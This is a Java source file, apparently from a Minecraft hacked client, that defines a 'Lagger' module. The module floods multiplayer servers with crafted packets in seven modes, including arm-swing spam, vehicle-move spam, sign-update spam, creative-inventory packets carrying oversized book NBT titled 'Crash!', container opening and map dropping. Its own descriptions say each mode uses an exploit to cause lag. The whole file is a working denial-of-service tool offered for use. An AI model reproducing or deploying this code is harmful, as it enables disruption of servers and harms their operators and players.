package me.rigamortis.seppuku.impl.module.misc;

import me.rigamortis.seppuku.api.event.EventStageable;
import me.rigamortis.seppuku.api.event.minecraft.EventDisplayGui;
import me.rigamortis.seppuku.api.event.player.EventPlayerUpdate;
import me.rigamortis.seppuku.api.module.Module;
import me.rigamortis.seppuku.api.value.Value;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.inventory.GuiContainer;
import net.minecraft.client.gui.inventory.GuiInventory;
import net.minecraft.entity.Entity;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.inventory.Container;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.*;
import net.minecraft.tileentity.*;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.text.TextComponentString;
import team.stiff.pomelo.impl.annotated.handler.annotation.Listener;

/**
 * Author Seth
 * 5/3/2019 @ 8:49 PM.
 */
public final class LaggerModule extends Module {

    public final Value<Mode> mode = new Value<Mode>("Mode", new String[]{"Mode", "M"}, "Change between various lagger modes, each utilizing a different exploit to cause lag.", Mode.BOXER);

    private enum Mode {
        BOXER, SWAP, MOVEMENT, SIGN, NBT, CONTAINER, MAP
    }

    public final Value<Integer> packets = new Value<Integer>("Packets", new String[]{"pckts", "packet"}, "Amount of packets to send each tick while running the chosen lag mode.", 500, 0, 5000, 1);

    private Container lastContainer = null;

    public LaggerModule() {
        super("Lagger", new String[]{"Lag"}, "Spams unoptimized packets", "NONE", -1, ModuleType.MISC);
    }

    @Override
    public String getMetaData() {
        return this.mode.getValue().name();
    }

    @Listener
    public void onUpdate(EventPlayerUpdate event) {
        if (event.getStage() == EventStageable.EventStage.PRE) {
            final Minecraft mc = Minecraft.getMinecraft();
            if (mc.player == null || mc.world == null)
                return;

            switch (this.mode.getValue()) {
                case BOXER:
                    for (int i = 0; i <= this.packets.getValue(); i++) {
                        mc.player.connection.sendPacket(new CPacketAnimation(EnumHand.MAIN_HAND));
                    }
                    break;
                case SWAP:
                    for (int i = 0; i <= this.packets.getValue(); i++) {
                        mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, BlockPos.ORIGIN, mc.player.getHorizontalFacing()));
                    }
                    break;
                case MOVEMENT:
                    for (int i = 0; i <= this.packets.getValue(); i++) {
                        final Entity riding = mc.player.getRidingEntity();
                        if (riding != null) {
                            riding.posX = mc.player.posX;
                            riding.posY = mc.player.posY + 1337;
                            riding.posZ = mc.player.posZ;
                            mc.player.connection.sendPacket(new CPacketVehicleMove(riding));
                        }
                    }
                    break;
                case SIGN:
                    for (TileEntity te : mc.world.loadedTileEntityList) {
                        if (te instanceof TileEntitySign) {
                            final TileEntitySign tileEntitySign = (TileEntitySign) te;

                            for (int i = 0; i <= this.packets.getValue(); i++) {
                                mc.player.connection.sendPacket(new CPacketUpdateSign(tileEntitySign.getPos(), new TextComponentString[]{new TextComponentString("give"), new TextComponentString("riga"), new TextComponentString("the"), new TextComponentString("green book")}));
                            }
                        }
                    }
                    break;
                case NBT:
                    final ItemStack itemStack = new ItemStack(Items.WRITABLE_BOOK);
                    final NBTTagList pages = new NBTTagList();

                    for (int page = 0; page < 50; page++) {
                        pages.appendTag(new NBTTagString("192i9i1jr1fj8fj893fj84ujv8924jv2j4c8j248vj2498u2-894u10fuj0jhv20j204uv902jv90j209vj204vj"));
                    }

                    final NBTTagCompound tag = new NBTTagCompound();
                    tag.setString("author", mc.session.getUsername());
                    tag.setString("title", "Crash!");
                    tag.setTag("pages", pages);
                    itemStack.setTagCompound(tag);

                    for (int i = 0; i <= this.packets.getValue(); i++) {
                        mc.player.connection.sendPacket(new CPacketCreativeInventoryAction(0, itemStack));
                        //mc.player.connection.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, itemStack, (short)0));
                    }
                    break;
                case CONTAINER:
                    for (TileEntity tileEntity : mc.world.loadedTileEntityList) {
                        if (tileEntity instanceof TileEntityChest || tileEntity instanceof TileEntityShulkerBox || tileEntity instanceof TileEntityEnderChest) {
                            if (mc.player.openContainer != this.lastContainer) {
                                mc.player.connection.sendPacket(new CPacketPlayerTryUseItemOnBlock(tileEntity.getPos(), EnumFacing.DOWN, EnumHand.MAIN_HAND, 0, 0, 0));
                                mc.player.connection.sendPacket(new CPacketCloseWindow());
                            }
                        }
                    }
                    break;
                case MAP:
                    /* made by @sn0wy01 */
                    mc.player.connection.sendPacket(new CPacketHeldItemChange(1));
                    mc.player.connection.sendPacket(new CPacketPlayerTryUseItemOnBlock(mc.player.getPosition().down(), EnumFacing.DOWN, EnumHand.MAIN_HAND, 0.0F, 0.0F, 0.0F));
                    mc.player.connection.sendPacket(new CPacketHeldItemChange(0));
                    mc.player.connection.sendPacket(new CPacketPlayerTryUseItem(EnumHand.MAIN_HAND));

                    for (int i = 0; i <= 44; ++i) {
                        if (mc.player.inventoryContainer.getSlot(i).getStack().getItem() == Items.FILLED_MAP) {
                            mc.playerController.windowClick(mc.player.openContainer.windowId, i, 0, ClickType.THROW, mc.player);
                            mc.player.inventory.removeStackFromSlot(i);
                        }
                    }
                    break;
            }
        }
    }

    @Listener
    public void onDisplayGui(EventDisplayGui event) {
        if (event.getScreen() != null) {
            if (this.mode.getValue().equals(Mode.CONTAINER)) {
                if (!(event.getScreen() instanceof GuiInventory) && event.getScreen() instanceof GuiContainer) {
                    GuiContainer guiContainer = (GuiContainer) event.getScreen();
                    this.lastContainer = guiContainer.inventorySlots;
                    event.setCanceled(true);
                }
            }
        }
    }
}
